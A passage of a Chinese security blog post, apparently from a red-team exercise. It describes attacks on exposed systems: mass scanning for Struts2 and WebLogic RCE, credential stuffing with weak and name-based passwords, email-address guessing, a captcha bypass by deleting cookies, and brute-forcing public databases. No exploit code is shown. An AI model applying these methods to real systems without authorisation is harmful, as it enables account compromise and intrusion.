<html>
<head>
<title>从外网到内网的渗透姿势分享</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
从外网到内网的渗透姿势分享
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    H4lo
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-06-03</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">现在这段时间是全员 hw 时期，刚好前几天也有幸参与了某个地方的 hw 行动，作为攻击方，这里就简单总结一下最近挖洞的思路吧。因为可能怕涉及到敏感的东西，这里就有的地方不会细说了。</p><p>因为本人比较菜，所以只能做一点比较基础的总结，大佬们请忽略吧...</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">渗透的大体过程</h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">整个渗透测试的流程就是通过信息收，集到外网的 web 漏洞挖掘，来获取一个 webshell ，通过这个 shell 进一步利用来打进内网，进行内网渗透、域渗透，最终获取域控权限的一个过程。</p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">从外网挖掘漏洞的一些方法</a></h2><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">常见的渗透思路这里就不介绍了，也比较常见，这里主要想纪录一下自己在测试中用到的方法。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">拿到相应的资产，解析完 ip 段或者网址之后，直接上大型扫描器！直接上大型扫描器！直接上大型扫描器！对你没有听错。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-backh="234" data-backw="556" data-before-oversubscription-url="https://mmbiz.qlogo.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAVskLtmWicnIQT5BzbH37cBUmqTRkGsxpQibJcppjmtgZmYo7Y4FAT5WQ/0?wx_fmt=png" data-ratio="0.42105263157894735" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/1_RkGsxpQibJcppjmtgZmYo7Y4FAT5WQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAVskLtmWicnIQT5BzbH37cBUmqTRkGsxpQibJcppjmtgZmYo7Y4FAT5WQ/640?wx_fmt=png'" data-type="png" data-w="1292" style="max-width: 90%;vertical-align: middle;border-width: 0px;border-style: initial;border-color: initial;text-align: center;margin: 0px;display: block;padding-top: 10px;padding-bottom: 10px;top: auto;left: auto;right: auto;bottom: auto;width: 100%;height: auto;"  /></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">需要检测 web 漏洞的话，需要对相应的 IP 进行端口扫描，端口扫描的话用<strong>御剑高速端口扫描工具</strong>这个工具，效果非常棒！把扫描的速度越调低结果就会越精确。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">扫描完成之后可以导出相应的扫描结果，得到相应的 IP 结果之后，再丢进 AWVS 直接使用脚本批量扫描，或者批量弱口令爆破就行了。<strong>总之套路就是需要注意批量！批量！批量！就行了</strong>。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这是上次批量扫了两天的结果，还是很可观，还是混了不少洞的啊哈哈哈哈。不过是否属于资产范围内的就需要自己验证了。</p><p style="text-align: center;"><img class="rich_pages" data-backh="133" data-backw="556" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAwGkBU24KRXAzibQoRPAMeTwiazkv57lXYN312PoP8FN8FlzMkRuUDyDw/0?wx_fmt=png" data-copyright="0" data-ratio="0.23966309341500766" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/2_kv57lXYN312PoP8FN8FlzMkRuUDyDw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAwGkBU24KRXAzibQoRPAMeTwiazkv57lXYN312PoP8FN8FlzMkRuUDyDw/640?wx_fmt=png'" data-type="png" data-w="1306" style="width: 100%;height: auto;"  /></p><h2 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.225;text-rendering: optimizelegibility;font-size:24px;line-height:44px;;padding-bottom: 0em;border-bottom: none;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">从外网撕开口子的常见操作</h2><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">框架、中间件漏洞</h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">最常见的就是 Struts2、weblogic 等已有的 RCE 漏洞。<br  />检测的方法就是使用现有的工具进行<strong>批量扫描</strong>，也可以自己写一个脚本进行指纹探测之后再检测漏洞。或者丢进 Nessus 或者 AWVS 中一般都可以自己检测出来。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">工具的话网上也比较多了，<strong>推荐使用 .net 写的小工具</strong>，网络发包速度快，也很稳定。</p><p>检测 S2 漏洞的话推荐使用<strong>Struts2漏洞检查工具2018版</strong>这个工具，可以批量！贼爽！</p><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">撞库漏洞</h3><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">主要是针对于一些员工系统和登录系统、信息查询系统、OA 系统进行撞库，在没有验证码的登录系统中屡试不爽。</p><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">测试方法</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>无验证码的情况</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">首先这些系统一般外部只有一个登录框，先查看有无验证码，没有验证码直接导入中国常见用户名字典，密码为弱口令字典（或者直接就设置成 123456）。</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="1.048951048951049" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/3_bvZCtFr9mlmI4z4FK4bJicWKw5e3xQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAXcwribNFcRCS7YgicwjzCanIUSQbvZCtFr9mlmI4z4FK4bJicWKw5e3xQ/640?wx_fmt=png'" data-type="png" data-w="572" style=""  /></p><p>或者密码可以改成<strong>用户名+数字</strong>的形式，例如用户名是 zhangsan，可以尝试每个用户对应的密码字典为 zhangsan12、zhangsan123 这种类型。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">若是邮箱登录，则需要先收集一下系统的邮箱后缀，常见的收集方法有 google hack、专门收集目标站邮箱的查询网址。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">拿到了后缀之后，使用<strong>用户拼音+邮箱后缀</strong>的方式进行爆破。注意这里有两种方式。</p><p><strong>用户名规则使用用户全拼音</strong>。例如 zhangsan@abc.com。</p><p><strong>用户名规则使用姓的全拼+名的缩写</strong>。例如 zhangs@abc.com，wangjk@abc.com。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>总的来说，第二种方式比较常见</strong>，也可以两种都试试。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><strong>有验证码的情况</strong></p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">这里就说下有验证码，但是验证码可以绕过的情况。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">如下面的情况，直接把 cookie 删除之后就不会验证 randcode 的值了，可能这代码写的也比较奇葩吧</p><p style="text-align: center;"><img class="rich_pages" data-copyright="0" data-ratio="0.20555138784696175" data-s="300,640" src="图片/HACK学习呀_2019-06-03_从外网到内网的渗透姿势分享/4_09dFkpMzWficMsLgsn0G0ge31NcKQQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou84HHLODqg37JF7iaFVyFWYAuAdEBMQ0GQQbUqVt2icxgQ0Y0e09dFkpMzWficMsLgsn0G0ge31NcKQQ/640?wx_fmt=png'" data-type="png" data-w="1333" style=""  /></p><h3 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.43;text-rendering: optimizelegibility;font-size:20px;line-height:40px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">弱口令漏洞</h3><h4 style="margin-top: 1em;margin-bottom: 16px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-weight: bold;line-height: 1.4;text-rendering: optimizelegibility;font-size:18px;line-height:38px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">公网数据库爆破</h4><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:15px;line-height:35px;;letter-spacing: 0.75px;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);">web 登录系统的弱口令爆破就不说了，有一种思路是直接对公网的 IP 地址的数据库弱口令爆破，个人感觉还是比较爽的。</p><p style="margin-bottom: 24px;font family: &quot;Monospaced Number&quot;, &quot;Chinese Quote&quot;, -apple-system, 